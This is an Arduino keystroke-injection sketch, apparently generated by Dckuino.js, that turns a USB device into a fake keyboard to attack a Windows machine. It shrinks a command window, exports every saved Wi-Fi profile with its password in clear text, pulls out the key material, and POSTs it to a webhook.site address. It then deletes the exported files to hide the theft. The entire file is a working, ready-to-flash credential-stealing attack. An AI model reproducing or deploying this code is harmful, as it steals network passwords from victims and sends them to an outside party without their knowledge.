/*
 * Generated with <3 by Dckuino.js, an open source project !
 */
 
#include "Keyboard.h"
 
void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}
 
/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();
 
  // Wait 500ms
  delay(500);
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("cmd /k mode con: cols=15 lines=1");
  typeKey(KEY_RETURN);
  
  delay(500);

  Keyboard.print("cd %temp%");
  typeKey(KEY_RETURN);
  delay(300);
  Keyboard.print("netsh wlan export profile key=clear");
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print("powershell Invoke-WebRequest -Uri https://webhook.site/2293946e-9b53-46fe-9ffe-7e34d5cfc7ef -Method POST -InFile Wi-Fi-PASS");
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("del Wi-* /s /f /q");
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  
  delay(100);
  typeKey(KEY_RETURN);
  // Ending stream
  Keyboard.end();
}
 
/* Unused endless loop */
void loop() {}
